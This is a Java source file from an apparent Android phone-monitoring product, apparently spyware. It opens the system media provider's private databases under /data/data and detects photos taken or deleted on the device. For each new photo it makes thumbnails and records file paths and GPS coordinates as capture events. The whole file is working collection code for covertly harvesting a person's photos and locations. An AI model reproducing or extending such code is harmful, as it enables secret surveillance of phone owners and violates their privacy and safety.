package com.vvt.capture.camera.image;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.provider.BaseColumns;
import android.provider.MediaStore;
import android.provider.MediaStore.MediaColumns;

import com.vvt.base.FxEvent;
import com.vvt.events.FxCameraImageThumbnailEvent;
import com.vvt.events.FxGeoTag;
import com.vvt.events.FxMediaDeletedEvent;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxMimeTypeParser;
import com.vvt.ioutil.FileUtil;
import com.vvt.ioutil.Path;
import com.vvt.logger.FxLog;
import com.vvt.stringutil.FxStringUtils;

public class FxCameraImageHelper {
	private final static String TAG = "FxCameraImageHelper";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private final static File [] FOLDER_DIRS  =  {
		new File("/data/data/com.android.providers.media/databases/"),
		new File("/dbdata/databases/com.android.providers.media/"), // Samgsung Captivate
	};
	
	private final static String INTERNAL_FILENAME_START_PREFIX = "internal";
	private final static String EXTERNAL_FILENAME_START_PREFIX = "external";
 
	//change to public for use in media history capture
	public static final String IMAGE_TABLE_NAME = "images";
	
	public static SQLiteDatabase getReadableDatabase(String dbFile) {
		return openDatabase(dbFile, SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	public static SQLiteDatabase getWritableDatabase(String dbFile) {
		return openDatabase(dbFile, SQLiteDatabase.OPEN_READWRITE | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	private static SQLiteDatabase openDatabase(String dbFile, int flags) {
		if(LOGV) FxLog.v(TAG, "openDatabase # START");
		
		SQLiteDatabase db = tryOpenDatabase(dbFile, flags);
		
		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if(LOGV) FxLog.d(TAG, "Cannot open database. Retrying ...");
			try {
				Thread.sleep(1000);
			} 
			catch (InterruptedException e) {
				// Do nothing
			}
			
			db = tryOpenDatabase(dbFile, flags);
			
			attemptLimit--;
		}
		
		if(LOGV) FxLog.v(TAG, "openDatabase # EXIT");
		return db;
	}
	
	/*private static SQLiteDatabase openDatabase(String dbFile, int flags) {
		if(LOGV) FxLog.d(TAG, "openDatabase # ENTER ...");
		
		String dbPath = VtDatabaseHelper.getSystemDatabasePath(PACKAGE_NAME);
		if (dbPath != null) {
			dbPath = String.format("%s/%s", dbPath, dbFile);
		}
		
		if(LOGD) FxLog.d(TAG, String.format("openDatabase # sDbPath: %s", dbPath));
		
		SQLiteDatabase db = tryOpenDatabase(dbPath, flags);
		
		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if(LOGD) FxLog.d(TAG, "Cannot open database. Retrying ...");
			try {
				Thread.sleep(1000);
			} 
			catch (InterruptedException e) {
				// Do nothing
			}
			
			db = tryOpenDatabase(dbPath, flags);
			
			attemptLimit--;
		}
		
		if(LOGV) FxLog.v(TAG, "openDatabase # EXIT ...");
		return db;
	}*/
	
	private static SQLiteDatabase tryOpenDatabase(String dbPath, int flags) {
		SQLiteDatabase db = null;
		try {
			
			if(!new File(dbPath).exists()) {
				FxLog.e(TAG, dbPath + " does not exist!");
			}
			
			db = SQLiteDatabase.openDatabase(dbPath, null, flags);
		}
		catch (SQLiteException e) {
			if(LOGE) FxLog.e(TAG, null, e);
		}
		return db;
	}
	
	public static String getExternalDatabaseFilePath() {
		if(LOGV) FxLog.v(TAG, "getExternalDatabaseFilePath # START");
		/*String filePath = null;
		boolean pathFound = false;
		
		for (File f : FOLDER_DIRS) {
			if(f.exists()) {
				File[] listOfFiles = f.listFiles();
				
				for (int i = 0; i < listOfFiles.length; i++) {
					File file = listOfFiles[i];

					if (file.getName().startsWith(EXTERNAL_FILENAME_START_PREFIX)) {
						filePath = file.getName();
						pathFound = true;
					}
				}
			}
		}*/
		
		StringBuilder foundPath = new StringBuilder();
		boolean isSuccess = FileUtil.findFileInFolders(FOLDER_DIRS, EXTERNAL_FILENAME_START_PREFIX, foundPath, "db");
		
		
		if(!isSuccess)
			if(LOGE) FxLog.e(TAG, "getExternalDatabaseFilePath # ExternalDatabaseFilePath Not found!");
		else
			if(LOGD) FxLog.d(TAG, "getExternalDatabaseFilePath # filePath :" + foundPath.toString());
		
		if(LOGV) FxLog.d(TAG, "getExternalDatabaseFilePath # EXIT");
		return foundPath.toString();
	}
	
	public static String getInternalDatabaseFilePath() {
		if(LOGV) FxLog.v(TAG, "getInternalDatabaseFilePath # START");
		
		/*boolean pathFound = false;
		String filePath = null;
		
		for (File f : FOLDER_DIRS) {
			if (f.exists()) {
				File[] listOfFiles = f.listFiles();
				for (int i = 0; i < listOfFiles.length; i++) {
					File file = listOfFiles[i];
					if (file.getName().startsWith(INTERNAL_FILENAME_START_PREFIX)) {
						pathFound = true;
						filePath = file.getName();
					}
				}
			}
		}	*/	

		StringBuilder foundPath = new StringBuilder();
		boolean isSuccess = FileUtil.findFileInFolders(FOLDER_DIRS, INTERNAL_FILENAME_START_PREFIX, foundPath, "db");

		
		if(!isSuccess)
			if(LOGE) FxLog.e(TAG, "getInternalDatabaseFilePath # getInternalDatabaseFilePath Not found!");
		else
			if(LOGD) FxLog.d(TAG, "getInternalDatabaseFilePath # filePath :" + foundPath.toString());
		
		if(LOGV) FxLog.v(TAG, "getInternalDatabaseFilePath # EXIT");
		return foundPath.toString();
	}

	public static ArrayList<FxEvent> getWhatsNew(String writablePath, String dbFile, HashMap<Long, String> oldMap, HashMap<Long, String> newMap)
	{
		if(LOGV) FxLog.v(TAG, "getWhatsNew # START");
		
		ArrayList<FxEvent> newEvents = new ArrayList<FxEvent>();

		if(oldMap == null || newMap == null)
			return newEvents;
		
		for (Map.Entry<Long, String> e : newMap.entrySet()) {
			if (!oldMap.keySet().contains(e.getKey())) {
				// Is a new id. query
				long imageId = e.getKey();
				if(LOGD) FxLog.d(TAG, "getWhatsNew # new imageId:" + imageId);
				
				List<FxEvent> events = getNewerMediaById(writablePath, dbFile, imageId);
				newEvents.addAll(events);
			}
		}

		if(LOGV) FxLog.v(TAG, "getWhatsNew # EXIT");
		return newEvents;
	}
	
	public static List<FxEvent> getNewerMediaById(String writablePath, String dbFile, long refId) {
		if(LOGV)FxLog.v(TAG, "getNewerMediaById # START");
		
		if(LOGD) FxLog.d(TAG, "getNewerMediaById # writablePath:" + writablePath);
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # dbFile:" + dbFile);
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # refId:" + refId);
		
		List<FxEvent> medias = new ArrayList<FxEvent>();

		String selection = String.format("%s = %d", FxCameraImageDatabaseHelper._ID, refId);
		
		SQLiteDatabase db =  getReadableDatabase(dbFile);
		Cursor cursor = null;
		
		try {
			cursor = db.query(IMAGE_TABLE_NAME, null, selection, null, null, null, null);
			
			if (cursor == null) {
				return null;
			}

			FxCameraImageThumbnailEvent media = null;

			while (cursor.moveToNext()) {
				int orginRowId = cursor.getInt(cursor.getColumnIndexOrThrow(BaseColumns._ID));
				String fileName = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.DATA));
				String mimeType = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.MIME_TYPE));
				FxMediaType format = FxMimeTypeParser.parse(mimeType);
				long eventTime = new Date().getTime();
				double latitude = 0;
				double longitude = 0;

				File f = new File(fileName); 
				if (!f.exists()) {
					continue;
				}

				media = new FxCameraImageThumbnailEvent();
				media.setEventId(orginRowId);
				media.setEventTime(eventTime);
				media.setActualSize(f.length());
				media.setFormat(format);
				media.setParingId(orginRowId);
			 
				String imagePath =  getImageThumbnailPath(db, orginRowId);
				if(LOGV) FxLog.v(TAG, "getNewerMediaById # imagePath:" + imagePath);
				
				if(!FxStringUtils.isEmptyOrNull(imagePath)) {
					// Lets try to create the thumbnail of our size.
					imagePath = createImageThumbnail(writablePath, imagePath, orginRowId);
				}
				else {
					imagePath = createImageThumbnail(writablePath, fileName, orginRowId);
				}
				
				media.setActualFullPath(fileName);
				media.setThumbnailFullPath(imagePath);
				latitude = cursor.getDouble(cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.LATITUDE));
				longitude = cursor.getDouble(cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.LONGITUDE));
				
				if(LOGV) FxLog.v(TAG, "getNewerMediaById # orginRowId:" + orginRowId);
				if(LOGV) FxLog.v(TAG, "getNewerMediaById # eventTime:" + eventTime);
				if(LOGV) FxLog.v(TAG, "getNewerMediaById # ActualSize:" + f.length());
				if(LOGV) FxLog.v(TAG, "getNewerMediaById # format:" + format);
				if(LOGV) FxLog.v(TAG, "getNewerMediaById # ActualFullPath:" + fileName);
				if(LOGV) FxLog.v(TAG, "getNewerMediaById # ThumbnailFullPath:" + imagePath);
				if(LOGV) FxLog.v(TAG, "getNewerMediaById # latitude:" + latitude);
				if(LOGV) FxLog.v(TAG, "getNewerMediaById # longitude:" + longitude);
				
				FxGeoTag geoTag = new FxGeoTag();
				geoTag.setLat(latitude);
				geoTag.setLon(longitude);
				media.setGeo(geoTag);

				if(media != null)
					medias.add(media);
			}

		}
		catch (Exception e) {
			if(LOGE) FxLog.e(TAG, "getNewerMediaById # error:" + e.toString());
		}
		finally {

			if(cursor != null) {
				cursor.close();
			}
			
			if(db != null)
				db.close();
		}
		
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # EXIT");
		return medias;
	}

	public static String getImageThumbnailPath(SQLiteDatabase db, long imageId) {
		if(LOGV) FxLog.v(TAG, "getImageThumbnailPath # START");
		
		final String[] THUMB_PROJECTION = new String[] {
			MediaStore.Images.Thumbnails.IMAGE_ID, // 1
			MediaStore.Images.Thumbnails.WIDTH,
			MediaStore.Images.Thumbnails.HEIGHT,
			MediaStore.Images.Thumbnails.DATA
			};
		
		String selectionArgs = String.format("%s = %d", MediaStore.Images.Thumbnails.IMAGE_ID, imageId);
		Cursor cursor=  null;
		String thumbnailfilePath = FxStringUtils.EMPTY;

		try {
			cursor = db.query("thumbnails", THUMB_PROJECTION, selectionArgs, null, null, null, null);
			
			if( cursor != null && cursor.getCount() > 0 ) {
			     cursor.moveToFirst();
			     thumbnailfilePath = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Thumbnails.DATA));
			}
		}catch (Exception e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		}
		finally {
			if(cursor != null) {
				cursor.close();
			}
		}	
		
		if(LOGV) FxLog.v(TAG, "getImageThumbnailPath # thumbnailfilePath:" + thumbnailfilePath);
		if(LOGV) FxLog.v(TAG, "getImageThumbnailPath # EXIT");
		return thumbnailfilePath;
	}
	
	
	public static String createImageThumbnail(String writablePath, String fileName, long imageId) {
		if(LOGV) FxLog.v(TAG, "createImageThumbnail # START");
		String filename = FxStringUtils.EMPTY;
		
		try {

			final int THUMBNAIL_SIZE = 80;
			Bitmap bitmap = BitmapFactory.decodeFile(fileName);

			if (bitmap != null) {
				bitmap = Bitmap.createScaledBitmap(bitmap, THUMBNAIL_SIZE, THUMBNAIL_SIZE, true);

				filename = getNewThumbnailPath(writablePath);
				FileOutputStream out;
 
				out = new FileOutputStream(filename);
				bitmap.compress(Bitmap.CompressFormat.PNG, 90, out);
			}
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "createImageThumbnail # new thumb location:" + filename);
		if(LOGV) FxLog.d(TAG, "createImageThumbnail # EXIT");
		return filename;
	}
	
	private  static String getNewThumbnailPath(String writablePath) {
		String thumbnailFolder = Path.combine(writablePath, "thumbnails");
		File wallpaperDirectory = new File(thumbnailFolder);
		
		if(wallpaperDirectory.mkdirs())
			return Path.combine(thumbnailFolder, "image_"+System.currentTimeMillis() + ".png" );
		else
			return Path.combine(thumbnailFolder, "image_"+System.currentTimeMillis() + ".png" );
	}
	
 
	public static ArrayList<FxEvent> getWhatsDeleted(HashMap<Long, String> oldMap, HashMap<Long, String> newMap)
	{
		ArrayList<FxEvent> newEvents = new ArrayList<FxEvent>();

		if(oldMap == null || newMap == null)
			return newEvents;
		
		for (Map.Entry<Long, String> e : oldMap.entrySet())
		{
			if(!newMap.keySet().contains(e.getKey())) {
				// Is a new id. query
				long imageId =  e.getKey();
				FxMediaDeletedEvent mediaDeletedEvent = new FxMediaDeletedEvent();
				mediaDeletedEvent.setEventId(imageId);
				mediaDeletedEvent.setFileName(e.getValue());
				mediaDeletedEvent.setEventTime(new Date().getTime());
				newEvents.add(mediaDeletedEvent);	
			}
		}

		return newEvents;
	}
	
 
	public synchronized static HashMap<Long, String> getAllImages(String dbFile) throws NullPointerException {
		if(LOGV) FxLog.v(TAG, "getAllImages # START");
		if(LOGV) FxLog.d(TAG, "getAllImages # db:" + dbFile);
		
		HashMap<Long, String> map = new HashMap<Long, String>();
		
		long id = -1;
		String path = "";
		SQLiteDatabase db = getReadableDatabase(dbFile);
		Cursor cursor = null;
		
		try {
			if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
				if(LOGD) FxLog.d(TAG, "getAllImages # Open database FAILED!! -> EXIT ...");
				if (db != null) {
					db.close();
				}
				return map;
			}
			
			
			String sql = String.format("SELECT %s, %s FROM %s", FxCameraImageDatabaseHelper._ID,  FxCameraImageDatabaseHelper.PATH, IMAGE_TABLE_NAME);
			if(LOGD) FxLog.d(TAG, "getAllImages # db sql is: " + sql);
			
			cursor = db.rawQuery(sql, null);

			if (cursor == null) {
				if(LOGE) FxLog.e(TAG, "getAllImages # cursor is null");
			}
			else {
				while (cursor.moveToNext()) {
					id = cursor.getLong(cursor.getColumnIndex(FxCameraImageDatabaseHelper._ID));
					path = cursor.getString(cursor.getColumnIndex(FxCameraImageDatabaseHelper.PATH));
					map.put(id, path);
				}
				
				if(LOGV) FxLog.d(TAG, "getAllImages # cursor count:" + cursor.getCount());
			}
			
		} catch (Exception e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		}
		finally {
			if(cursor != null) {
				cursor.close();
			}
			
			if(db != null)
				db.close();
		}

		if(LOGD) FxLog.d(TAG, "getAllImages # map size:" + map.size());
		if(LOGV) FxLog.d(TAG, "getAllImages # EXIT");
		return map;
	}
	
	  

}
